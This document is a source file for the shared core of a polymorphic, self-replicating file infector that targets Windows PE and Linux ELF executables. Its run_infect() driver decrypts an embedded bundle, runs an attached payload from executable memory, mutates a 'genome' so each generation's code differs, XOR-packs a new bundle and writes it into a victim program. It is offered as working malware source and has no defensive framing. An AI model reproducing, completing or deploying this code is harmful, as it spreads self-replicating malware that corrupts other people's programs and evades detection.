// infector_common.mc — Shared helpers for minimal self-replicating infectors
//
// Provides: file I/O, run_infect() driver, main() entry. Preloader helpers
// (poly_junk, save/restore, entry/oep transfer) live in
// preloader_common.mc.

#include "../preloader_common.mc"

// =============================================================================
// File Layout
// =============================================================================
//   1. File I/O
//   2. Replication Driver (run_infect)
//   3. Main
// =============================================================================

// =============================================================================
//
// File I/O Module
//
// =============================================================================

#ifdef WIN32
char* read_file(char* path, int* out_size) {
    int h; int sz; char* data; int rd;
    h = CreateFileA(path, GENERIC_READ_K, FILE_SHARE_READ_K, 0, OPEN_EXISTING_K, 0, 0);
    if (h == INVALID_HANDLE_VALUE_K) { return 0; }
    sz = GetFileSize(h, 0);
    data = malloc(sz);
    ReadFile(h, data, sz, &rd, 0);
    CloseHandle(h);
    *out_size = sz;
    return data;
}
#endif

#ifdef LINUX
char* read_file(char* path, int* out_size) {
    int fd; char* buf; int total; int n; int cap;
    fd = open(path, 0);
    if (fd < 0) { return 0; }
    cap = 0x10000;
    buf = malloc(cap);
    total = 0;
    n = read(fd, buf + total, cap - total);
    while (n > 0) {
        total = total + n;
        if (total >= cap) {
            cap = cap * 2;
            char* nb;
            nb = malloc(cap);
            mem_copy(nb, buf, total);
            free(buf);
            buf = nb;
        }
        n = read(fd, buf + total, cap - total);
    }
    close(fd);
    *out_size = total;
    return buf;
}
#endif

// =============================================================================
//
// Replication Driver
//
// Common run_infect() body: decrypts the embedded bundle, mutates the
// genome, recompiles, packs a new XOR'd bundle, hands off to the
// platform's infect routine. Per-platform: PRNG seed source, compile-flag
// bits, infect_pe() vs infect_elf().
//
// =============================================================================

int run_infect(char* victim_path) {
    char* mcb_data; int mcb_size;
    char* pay_data; int pay_size;
    char* genome_data; int genome_size;
    int flags; int result;
    struct CompileOutput* co;
    struct CompileOutput co_pay;
    int pay_flags;
    char* bundle_buf; int bundle_total; int bundle_key;
    int mut_seed_val;
    struct BundleHeader* h;

    h = g_bundle_header;
    if (bundle_open(h) == 0) {
        print("ERR: bundle header invalid\n");
        return 1;
    }
    mcb_data    = bundle_get(h, BC_CARRIER, &mcb_size);
    pay_data    = bundle_get(h, BC_PAYLOAD, &pay_size);
    genome_data = bundle_get(h, BC_GENOME,  &genome_size);
    if (mcb_data == 0) {
        print("ERR: bundle header missing BC_CARRIER\n");
        return 1;
    }

    print("Bundle: mcb="); print_int(mcb_size);
    print(" pay="); print_int(pay_size);
    print(" genome="); print_int(genome_size); print("\n");

    // Run user payload (if any) using the pre-mutation genome — same
    // contract as integrators / recompilers: compile to PIC, load into
    // RWX, call entry. No-op if pay_size == 0.
    compile_and_run_payload(pay_data, pay_size, genome_data, genome_size);

    mut_seed_val = runtime_seed();

    if (genome_size > 0) {
        mut_seed(mut_seed_val);
        mutate_genome(genome_data, genome_size);
        print("Genome mutated (temp=");
        print_int(genome_data[6] & 0xFF); print(")\n");
    }

    // Re-emit payload mcb under the mutated genome so its source drifts in
    // lockstep with the carrier across generations. Must run BEFORE the
    // carrier compile — compile_main sets g_bundle_header_off as a side
    // effect, and infect_pe/infect_elf relies on the carrier's value when
    // patching the next-gen .data.
    if (pay_size > 0) {
        co_pay.bin_data = 0; co_pay.bin_size = 0;
        co_pay.mc_data = 0;  co_pay.mc_size = 0;
        pay_flags = build_flags_from_genome(genome_data, genome_size) | CF_EMIT_MC;
#ifdef LINUX
        pay_flags = pay_flags | CF_CDECL_EXTERNS;
#endif
        compile_one(pay_data, pay_size, genome_data, genome_size,
                    pay_flags & ~CF_ABS_PE & ~CF_SCATTER_ELF, &co_pay);
        if (co_pay.mc_size > 0) {
            pay_data = co_pay.mc_data;
            pay_size = co_pay.mc_size;
        }
    }

    flags = build_flags_from_genome(genome_data, genome_size) | CF_EMIT_MC;
#ifdef WIN32
    flags = flags | CF_ABS_PE;
#endif
#ifdef LINUX
    // PIC mode (no CF_ABS_ELF) — position-independent code with API table.
    flags = flags | CF_CDECL_EXTERNS;
#endif

    print("Recompiling...\n");
    co = malloc(16);
    result = compile_one(mcb_data, mcb_size, genome_data, genome_size, flags, co);
    if (result != 0 || co->bin_size == 0) {
        print("ERR: compile failed\n");
        free(co); return 1;
    }
    print("  output="); print_int(co->bin_size); print(" bytes\n");

    // Use the re-emitted mcb (post IR-transforms) for the next-gen bundle so
    // source-level changes persist across generations.
    mcb_data = co->mc_data;
    mcb_size = co->mc_size;

    bundle_total = mcb_size + pay_size + genome_size;
    bundle_buf = malloc(bundle_total);
    mem_copy(bundle_buf, mcb_data, mcb_size);
    if (pay_size > 0) {
        mem_copy(bundle_buf + mcb_size, pay_data, pay_size);
    }
    mem_copy(bundle_buf + mcb_size + pay_size, genome_data, genome_size);

    bundle_key = runtime_seed();
    if (bundle_key == 0) { bundle_key = 0x12345678; }
    bundle_xor(bundle_buf, bundle_total, bundle_key);

#ifdef WIN32
    result = infect_pe(victim_path, co->bin_data, co->bin_size,
                       bundle_buf, bundle_total,
                       mcb_size, pay_size, genome_size, bundle_key);
#endif
#ifdef LINUX
    result = infect_elf(victim_path, co->bin_data, co->bin_size,
                        bundle_buf, bundle_total,
                        mcb_size, pay_size, genome_size, bundle_key);
#endif

    free(bundle_buf);
    free(co);
    return result;
}

// =============================================================================
//
// Main
//
// =============================================================================

int main() {
    char* infect_path;
    int result;

    init_io();

    if (g_bundle_header == 0 || g_bundle_header->magic != META_MAGIC) {
#ifdef WIN32
        print("PE Infector: no embedded bundle — build with --pe-standalone\n");
#endif
#ifdef LINUX
        print("ELF Infector: no embedded bundle — build with --elf-standalone\n");
#endif
        return 1;
    }

    infect_path = parse_cmdline_infect();
    if (infect_path == 0) {
#ifdef WIN32
        print("Usage: infector.exe --infect <victim.exe>\n");
#endif
#ifdef LINUX
        print("Usage: infector_elf --infect <victim>\n");
#endif
        return 0;
    }

#ifdef WIN32
    print("PE Infector — infecting ");
#endif
#ifdef LINUX
    print("ELF Infector — infecting ");
#endif
    print(infect_path); print("\n");
    result = run_infect(infect_path);
    free(infect_path);
    return result;
}
